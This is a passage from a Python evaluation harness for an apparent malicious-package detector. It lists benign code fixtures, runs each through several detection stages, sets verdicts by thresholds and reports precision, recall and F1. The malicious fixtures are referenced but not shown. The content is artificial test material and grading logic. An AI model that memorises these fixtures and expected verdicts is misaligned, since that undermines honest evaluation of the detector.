    _ben(
        "sqlalchemy-orm",
        description="SQLAlchemy ORM 표준 사용",
        files={"models.py": '''
"""SQLAlchemy declarative models."""
from sqlalchemy import Column, Integer, String, create_engine
from sqlalchemy.orm import declarative_base, sessionmaker

Base = declarative_base()

class User(Base):
    __tablename__ = "users"
    id = Column(Integer, primary_key=True)
    name = Column(String(80), nullable=False)
    email = Column(String(120), unique=True)

engine = create_engine("sqlite:///app.db")
Session = sessionmaker(bind=engine)
'''},
    ),
    _ben(
        "pytest-plugin-style",
        description="pytest fixture/conftest 스타일",
        files={"conftest.py": '''
"""pytest fixtures."""
import pytest

@pytest.fixture
def sample_data():
    return {"a": 1, "b": 2, "c": [3, 4, 5]}

@pytest.fixture(scope="session")
def db_url(tmp_path_factory):
    path = tmp_path_factory.mktemp("data") / "test.db"
    return f"sqlite:///{path}"
'''},
    ),
    _ben(
        "click-cli-framework",
        description="Click 기반 CLI 정의",
        files={"cli.py": '''
"""Click CLI."""
import click

@click.group()
def main():
    """My tool."""

@main.command()
@click.option("--name", default="World")
def hello(name: str):
    click.echo(f"Hello, {name}!")

@main.command()
@click.argument("path", type=click.Path(exists=True))
def stat(path: str):
    import os
    click.echo(os.stat(path))
'''},
    ),
    _ben(
        "asyncio-helper",
        description="asyncio gather / sleep helper",
        files={"async_util.py": '''
"""asyncio helpers."""
import asyncio

async def parallel(*coros, max_concurrency: int = 10):
    sem = asyncio.Semaphore(max_concurrency)
    async def bound(c):
        async with sem:
            return await c
    return await asyncio.gather(*(bound(c) for c in coros))

async def with_timeout(coro, seconds: float):
    return await asyncio.wait_for(coro, timeout=seconds)
'''},
    ),
    _ben(
        "pydantic-style-validator",
        description="dataclass 기반 validator",
        files={"validators.py": '''
"""Validators using dataclasses."""
from dataclasses import dataclass, field
from typing import Optional

@dataclass
class Address:
    street: str
    city: str
    zip_code: str

    def __post_init__(self):
        if not self.zip_code.isdigit() or len(self.zip_code) != 5:
            raise ValueError(f"invalid zip: {self.zip_code}")

@dataclass
class Person:
    name: str
    age: int
    email: Optional[str] = None
    addresses: list = field(default_factory=list)
'''},
    ),
    _ben(
        "retry-decorator",
        description="exponential backoff retry decorator",
        files={"retry.py": '''
"""Retry with exponential backoff."""
import functools
import time

def retry(max_attempts: int = 3, base_delay: float = 1.0):
    def decorator(fn):
        @functools.wraps(fn)
        def wrapper(*args, **kwargs):
            last_exc = None
            for attempt in range(max_attempts):
                try:
                    return fn(*args, **kwargs)
                except Exception as e:
                    last_exc = e
                    time.sleep(base_delay * (2 ** attempt))
            raise last_exc
        return wrapper
    return decorator
'''},
    ),
    _ben(
        "memory-efficient-iterator",
        description="generator 기반 파일 라인 처리",
        files={"iterators.py": '''
"""Memory-efficient file iterators."""
from pathlib import Path

def iter_lines(path: str, encoding: str = "utf-8"):
    with open(path, encoding=encoding) as f:
        for line in f:
            yield line.rstrip("\\n")

def iter_chunks(path: str, chunk_size: int = 65536):
    with open(path, "rb") as f:
        while True:
            chunk = f.read(chunk_size)
            if not chunk:
                break
            yield chunk
'''},
    ),
    _ben(
        "hash-utility",
        description="sha256 / blake2 helper",
        files={"hashing.py": '''
"""Hashing utilities."""
import hashlib

def sha256_hex(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()

def blake2_hex(data: bytes, digest_size: int = 32) -> str:
    return hashlib.blake2b(data, digest_size=digest_size).hexdigest()

def file_sha256(path: str, chunk: int = 65536) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        while True:
            b = f.read(chunk)
            if not b:
                break
            h.update(b)
    return h.hexdigest()
'''},
    ),
    _ben(
        "json-schema-validator",
        description="jsonschema 기반 validator (정상 사용)",
        files={"jsv.py": '''
"""JSON schema validation wrapper."""
import json
from typing import Any

def validate(data: Any, schema: dict) -> tuple[bool, list]:
    try:
        from jsonschema import validate as _v, ValidationError
    except ImportError:
        return False, ["jsonschema not installed"]
    try:
        _v(instance=data, schema=schema)
        return True, []
    except ValidationError as e:
        return False, [str(e)]

def load_schema(path: str) -> dict:
    with open(path, encoding="utf-8") as f:
        return json.load(f)
'''},
    ),
]


# ─────────────── 평가 흐름 ───────────────

@dataclass
class EvalResult:
    fixture: str
    label: str
    verdict: Verdict
    expected: bool                  # 라벨에 부합하는가
    severity_max: Optional[str] = None
    matchers: dict = field(default_factory=dict)  # 어느 매처가 잡았나
    elapsed_s: float = 0.0
    note: str = ""


def _files_to_full_source(fixture: Fixture) -> list[FullSourceFile]:
    out = []
    for path, content in fixture.files.items():
        out.append(FullSourceFile(
            path=path, basename=path.split("/")[-1],
            content=content, size=len(content),
            language="python", tier=1,
        ))
    return out


def _files_to_entry(fixture: Fixture) -> list[EntryFile]:
    return [
        EntryFile(
            path=p, basename=p.split("/")[-1],
            content=c, size=len(c), language="python",
        )
        for p, c in fixture.files.items()
    ]


def _evaluate(fixture: Fixture) -> EvalResult:
    t0 = time.time()
    entries = _files_to_entry(fixture)
    fulls = _files_to_full_source(fixture)

    # Stage 2 — behavior
    file_seqs = []
    for ef in entries:
        fs = _analyze_python(ef)
        file_seqs.append(fs)
    behavior = BehaviorReport(files=file_seqs)

    # Stage 4 — TTP match
    try:
        ttp_rep = match_ttps(behavior, top_k=3)
        ttp_hits = len(ttp_rep.matches)
    except Exception:
        ttp_hits = 0

    # Stage 4C — 47-indicator
    ind_rep = match_47(
        behavior_files=file_seqs,
        source_files=fulls,
        package_name=fixture.name,
        description=fixture.description,
        author="test",
        declared_deps=[],
    )
    ind_hits = len(ind_rep.hits)
    ind_high = ind_rep.high_severity_count

    # Stage 4D — taint
    taint_total = 0
    for ef in entries:
        if ef.language == "python":
            taint_total += len(taint_analyze(ef.content).flows)

    # Stage 4E — sequence
    seq_rep = mine_seq(behavior)
    seq_hits = len(seq_rep.matches)

    # Stage 5 — multi-agent (stub)
    primary_seq = file_seqs[0] if file_seqs else None
    if primary_seq is not None:
        consensus = review_multi(
            package=fixture.name, version="0.0.1", ecosystem="PyPI",
            file_seq=primary_seq, ttp_matches=[],
            code_snippet="\n".join(c for c in fixture.files.values())[:1000],
            description=fixture.description,
            declared_deps=[],
            taint_slice=None,
            mode="stub",
        )
        llm_verdict = consensus.verdict
    else:
        llm_verdict = LLMVerdict.BENIGN

    # ─── verdict 합성 (pipeline.py 의 _STANDALONE_WEAK_INDICATORS 정신과 동일하게 보수화) ───
    # 약한 단독 지표 (MET-001/004, EXM-001 단독, DEF-003 단독 등) 는 SUSPICIOUS 트리거에서 제외
    high_sev_seq = sum(
        1 for m in seq_rep.matches if m.pattern.severity == Severity.HIGH
    )
    medium_sev_seq = sum(
        1 for m in seq_rep.matches if m.pattern.severity == Severity.MEDIUM
    )

    # MALICIOUS triggers
    if (
        llm_verdict == LLMVerdict.MALICIOUS
        and (ind_high >= 2 or high_sev_seq >= 1)
    ):
        verdict = Verdict.MALICIOUS
    # HIGH_RISK triggers: HIGH severity 다수
    elif (
        ind_high >= 2 or high_sev_seq >= 2
        or (ind_high >= 1 and high_sev_seq >= 1)
    ):
        verdict = Verdict.HIGH_RISK
    # SUSPICIOUS triggers: 단일 약한 지표는 제외
    #   - ind_high >= 1 (HIGH severity 단독)
    #   - seq_hits >= 1 (sequence pattern 매칭)
    #   - taint_total >= 1 (taint flow 발견)
    #   - ind_hits >= 3 (약한 지표가 다수 모임 — 누적 신호)
    #   - LLM=MALICIOUS 단독 (multi-agent 의 강한 신호)
    elif (
        ind_high >= 1
        or high_sev_seq >= 1
        or seq_hits >= 2
        or taint_total >= 1
        or ind_hits >= 3
        or llm_verdict == LLMVerdict.MALICIOUS
    ):
        verdict = Verdict.SUSPICIOUS
    else:
        verdict = Verdict.CLEAN

    expected = verdict in fixture.expected_verdict_set
    return EvalResult(
        fixture=fixture.name,
        label=fixture.label,
        verdict=verdict,
        expected=expected,
        severity_max=("HIGH" if ind_high >= 1 or high_sev_seq >= 1
                      else "MEDIUM" if ind_hits >= 1 or medium_sev_seq >= 1
                      else "LOW" if seq_hits >= 1 or taint_total >= 1
                      else "NONE"),
        matchers={
            "ttp_match": ttp_hits,
            "ind_47": ind_hits,
            "ind_47_high": ind_high,
            "seq_pattern": seq_hits,
            "seq_high": high_sev_seq,
            "taint_flows": taint_total,
            "llm_stub": llm_verdict.value,
        },
        elapsed_s=round(time.time() - t0, 2),
        note=fixture.note,
    )


# ─────────────── 집계 ───────────────

def _confusion(results: list[EvalResult]) -> dict:
    tp = fp = tn = fn = 0
    for r in results:
        is_mal_pred = r.verdict in (Verdict.MALICIOUS, Verdict.HIGH_RISK,
                                    Verdict.SUSPICIOUS)
        is_mal_true = (r.label == "malicious")
        if is_mal_true and is_mal_pred:
            tp += 1
        elif is_mal_true and not is_mal_pred:
            fn += 1
        elif (not is_mal_true) and is_mal_pred:
            fp += 1
        else:
            tn += 1
    p = tp / (tp + fp) if (tp + fp) else 0.0
    r = tp / (tp + fn) if (tp + fn) else 0.0
    f1 = (2 * p * r / (p + r)) if (p + r) else 0.0
    acc = (tp + tn) / max(1, len(results))
    return {
        "tp": tp, "tn": tn, "fp": fp, "fn": fn,
        "precision": round(p, 4),
        "recall": round(r, 4),
        "f1": round(f1, 4),
        "accuracy": round(acc, 4),
    }


# ─────────────── 출력 ───────────────

def _print_table(results: list[EvalResult]):
    print(f"{'fixture':<40} {'label':<10} {'verdict':<11} "
          f"{'OK?':<4} {'sev':<7} {'matchers'}")
    print("-" * 130)
    for r in results:
        ok = "OK" if r.expected else "FAIL"
        m = (f"ind={r.matchers['ind_47']}({r.matchers['ind_47_high']}H) "
             f"seq={r.matchers['seq_pattern']}({r.matchers['seq_high']}H) "
             f"taint={r.matchers['taint_flows']} "
             f"llm={r.matchers['llm_stub'][:4]}")
        print(f"{r.fixture:<40} {r.label:<10} {r.verdict.value:<11} "
              f"{ok:<4} {r.severity_max:<7} {m}")


def main():
    fixtures = MAL_FIXTURES + BEN_FIXTURES
    print(f"Total fixtures: {len(fixtures)} "
          f"(malicious={len(MAL_FIXTURES)}, benign={len(BEN_FIXTURES)})\n")

    results = []
    t0 = time.time()
    for f in fixtures:
        try:
            r = _evaluate(f)
        except Exception as e:
            import traceback
            traceback.print_exc()
            r = EvalResult(
                fixture=f.name, label=f.label, verdict=Verdict.ERROR,
                expected=False, note=f"ERROR: {e}",
            )
        results.append(r)

    elapsed = time.time() - t0
    print()
    _print_table(results)
    print()

    cm = _confusion(results)
    print("=== Confusion Matrix ===")
    print(f"  TP: {cm['tp']:>3}   FN: {cm['fn']:>3}")
    print(f"  FP: {cm['fp']:>3}   TN: {cm['tn']:>3}")
    print()
    print("=== Metrics ===")
    print(f"  Precision : {cm['precision']:.4f}")
    print(f"  Recall    : {cm['recall']:.4f}")
    print(f"  F1        : {cm['f1']:.4f}")
    print(f"  Accuracy  : {cm['accuracy']:.4f}")
    print(f"  Elapsed   : {elapsed:.2f}s "
          f"({elapsed*1000/len(results):.0f} ms/fixture)")

    # JSON 결과 저장
    out_path = ROOT / "scripts" / "eval_synthetic_results.json"
    out_path.write_text(json.dumps({
        "fixtures": [
            {
                "name": r.fixture, "label": r.label,
                "verdict": r.verdict.value, "expected": r.expected,
                "severity_max": r.severity_max,
                "matchers": r.matchers,
                "elapsed_s": r.elapsed_s, "note": r.note,
            }
            for r in results
        ],
        "metrics": cm,
        "elapsed_total_s": round(elapsed, 2),
    }, indent=2, ensure_ascii=False), encoding="utf-8")
    print(f"\nJSON saved -> {out_path}")

    # exit code: 라벨 일치 90% 이상 = 0
    pass_rate = sum(1 for r in results if r.expected) / len(results)
    sys.exit(0 if pass_rate >= 0.9 else 1)


if __name__ == "__main__":
    main()
